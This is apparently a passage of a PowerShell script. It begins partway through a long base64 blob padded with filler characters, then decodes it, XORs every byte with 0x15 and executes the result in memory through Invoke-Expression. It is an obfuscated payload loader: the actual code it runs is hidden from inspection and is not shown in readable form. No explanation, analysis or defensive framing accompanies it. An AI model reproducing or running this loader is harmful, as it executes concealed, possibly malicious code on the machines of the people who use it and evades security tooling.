U0xUT0RXbFRdWFR0RFdjVFIhVFRUVG1UViFUWFRUYFRRVFRZclRiVFRUVFpUVFxUVFBURERXb1Rd
WFRPRFdhVFJcVHdUVyBUVlRUQ3JXeVRdXFR2YldlVFItVHdyVFRUUVBUWXJUYlRWIVRYVFRgVFFU
VFRUVi1EYlRUI3JQVFRUVFRUVFRUVFRUVCIiYDpFUSwhd0JicnF4Q2x2J3ljd38lfFhGIWJcfFd5
d3hbY09SeWBPbyV8Q0NHUllBcnxcXVslTEIgfkxCbWN3eEAsXHt5eXZsXDpFciVeUUR6LUxNW29P
QiR8d11+cnBSJGZ3e1gsXHtDbHd/ZW9MJ315d0JTb1lCJGVMJl9jdicseHFWJH93JyUjTE1bYVl7
TG1cfFdhTEIgZU94Q29xU095dntbZXcnISxcf1BgWFZcPlFEenJcUW19diZbeXdCX2ZwQHl+T0Ig
JXRNRyBcXU95dntbZXcnISxcf1BgWFYhYll/VHxcUiB9d0JALFx+JCBETVdid1J5f0xNR2V3JyFg
TE1XYlx8LT5RRHpyXFFtJXZ7Q29xUHlgT3gtcnBSJGZ3e1gsXHtDbHd/ZW9MJ315d0JTb1lCJGVM
Jl9jdicseHFWJH93JyUjTE1bYVl7TGxcfyFbVnxUclxWVC12J0N/cU1fZXFdfj5RRHpyXFZUclxW
VC12eENtcUJDb3FSQ35AXV9lcXh5Zk9CcXl2bFchd0JtYHZvJXxxTV9gWntbf3RSQ2FMTVhhd0J5
f3Z4LG93J08lWUJbY3dBZX12JyVgcX9YfEVyJV5cVlRyXFZUclxWVC12eENtcUJDb3FSQ35HTX15
TCZDJXRCLGBBUkMnT0JicndSQydPQmIsXHhTb0ZCICd3J2F5dnxccnFCeVdMJ1t5diZYLFx4T313
XVt5XHwtPlFEenJcVlRyXFZULVkmX3l2TUN5diZHeU9TV2x0TU9ld1JDe09NWD5RRHpyXFZUckVW
LG9PQlskdnh5JXBBIVtWfFRyRVYsJXZ7Q29xUHlgT3gtPlFEei1ZJ1NvdidDYUx4bSBFclRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRiVFRUWFRUVFRbUXJUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFQ3
GB81NTU1MUdURjUoNU5GbGZhcHg7R3BzeXB2YXx6eztUZmZweHd5bEgvL1l6dHE9TlZ6e2NwZ2FI
Ly9TZ3p4V3RmcCMhRmFnfHtyPTF3dGZwIyF3fHt0Z2w8PBgfNTU1NRgfNTU1NTFaeXFWentmenlw
WmBhNSg1TlZ6e2Z6eXBILy9aYGEYHzU1NTUxRmFnfHtyQmd8YXBnNSg1W3BiOFp3f3B2YTVcWjtG
YWd8e3JCZ3xhcGcYHzU1NTVOVnp7Znp5cEgvL0ZwYVpgYT0xRmFnfHtyQmd8YXBnPBgfNTU1NRgf
NTU1NU5GfXRnZV0kcXA7RWd6cmd0eEgvL3h0fHs9MVZ6eHh0e3E7RmV5fGE9NzU3PDwYHxgfNTU1
NU5WentmenlwSC8vRnBhWmBhPTFaeXFWentmenlwWmBhPBgfNTU1NTFHcGZgeWFmNSg1MUZhZ3x7
ckJnfGFwZztBekZhZ3x7cj08GB81NTU1MUdwZmB5YWYYHzU1GB9oGB8="

$file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
$data = $enc.GetBytes($file)|%{$_-bXor0x15}
iex ([System.Text.Encoding]::ASCII.GetString($data))

